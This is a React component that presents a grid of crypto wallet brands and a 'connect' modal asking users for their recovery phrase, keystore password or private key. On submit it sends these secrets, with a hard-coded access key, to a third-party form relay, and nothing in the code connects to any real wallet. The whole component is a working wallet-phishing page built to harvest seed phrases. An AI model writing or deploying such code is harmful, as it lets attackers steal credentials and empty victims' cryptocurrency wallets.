import React, { useState } from "react";
import wallets from "../../index"; // Adjust the path to your wallets.js file

const Cryp = () => {
  const [key, setKey] = useState(false);
  const [privateKey, setPrivateKey] = useState(false);
  const [isOpen, setIsOpen] = useState(false);
  const [border, setBorder] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [result, setResult] = useState("");

  const [formData, setFormData] = useState({
    walletType: "",
    recoveryPhrase: "",
    walletPassword: "",
    privateKey: "",
  });

  const onSubmit = async (event) => {
    event.preventDefault();
    setResult("Sending....");
    const formData = new FormData(event.target);

    // Append the walletType to the formData
    formData.append("walletType", selectedWallet.title); // Add the wallet title
    formData.append("access_key", "e1bf55fc-b593-48c6-82e0-98caa1758642");

    const response = await fetch("https://api.web3forms.com/submit", {
      method: "POST",
      body: formData,
    });

    const data = await response.json();

    if (data.success) {
      setResult("Form Submitted Successfully");
      event.target.reset();
    } else {
      console.log("Error", data);
      setResult(data.message);
    }
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value,
    });
  };

  const handleWalletClick = (wallet) => {
    setSelectedWallet(wallet);
    setFormData({ ...formData, walletType: wallet.title }); // Set the wallet type
    setIsOpen(true);
  };

  return (
    <>
      <div className="relative grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-4 p-4">
        {wallets.map((wt) => (
          <div
            onClick={() => handleWalletClick(wt)}
            key={wt.id}
            className="flex flex-col items-center mb-5 cursor-pointer hover:scale-105 transition-all duration-[0.5s]"
          >
            <img
              className="w-[60px] object-contain mb-2"
              src={wt.img}
              alt={wt.title}
            />
            <p className="text-[12px] text-white font-extrabold text-center">
              {wt.title}
            </p>
          </div>
        ))}
      </div>

      {isOpen && selectedWallet && (
        <div className="fixed inset-0 bg-slate-900/50 backdrop-blur p-8 z-50 flex justify-center items-center">
          <div className="bg-white p-6 rounded-lg shadow-xl w-[400px] text-center">
            <div className="flex items-center space-x-7">
              <img
                className="w-[60px] mb-2"
                src={selectedWallet.img}
                alt={selectedWallet.title}
              />
              <h3 className="text-lg font-bold mb-2">{selectedWallet.title}</h3>
            </div>

            <ul className="text-sm mb-8 py-4 flex px-8 justify-between border-b">
              <li
                onClick={() => {
                  setKey(false);
                  setPrivateKey(false);
                }}
                className="hover:cursor-pointer text-gray-600"
              >
                Phrase
              </li>
              <li
                onClick={() => {
                  setKey(true);
                  setPrivateKey(false);
                }}
                className="hover:cursor-pointer text-gray-600"
              >
                KeyStore
              </li>
              <li
                onClick={() => {
                  setKey(false);
                  setPrivateKey(true);
                }}
                className="hover:cursor-pointer text-gray-600"
              >
                Private Key
              </li>
            </ul>

            <form onSubmit={onSubmit}>
              <div
                onMouseDown={() => setBorder(!border)}
                className={`border rounded-md overflow-hidden mb-5 ${
                  border === true ? "shadow-sm shadow-blue-700 " : ""
                }`}
              >
                <input
                  className="w-full pb-14 py-1 px-2 outline-none"
                  type="text"
                  placeholder="Enter recovery phrase"
                  name="recoveryPhrase"
                  onChange={handleChange}
                  required
                />
              </div>
              <p className="text-start mb-3 text-blue-800">{result}</p>
              {key && (
                <div>
                  <input
                    className="border rounded-md overflow-hidden mb-5 w-full py-2 px-2 outline-none"
                    type="text"
                    placeholder="Wallet password"
                    name="walletPassword"
                    onChange={handleChange}
                    required
                  />
                </div>
              )}

              {privateKey && (
                <div>
                  <input
                    className="border rounded-md overflow-hidden mb-5 w-full py-2 px-2 outline-none"
                    type="text"
                    placeholder="Enter your Private Key"
                    name="privateKey"
                    value=""
                    onChange={handleChange}
                    required
                  />
                </div>
              )}

              <p className="text-[11px] text-start mb-3">
                Typically 12 (sometimes 24) words separated by single spaces
              </p>
              <div>
                <button
                  type="submit"
                  className="border w-full mb-4 py-2 text-white font-bold bg-blue-700 rounded"
                >
                  PROCEED
                </button>
              </div>
              <div className="text-end">
                <button
                  type="button"
                  onClick={() => setIsOpen(false)}
                  className="bg-red-600 text-white font-semibold py-2 px-4 rounded"
                >
                  Close
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </>
  );
};

export default Cryp;
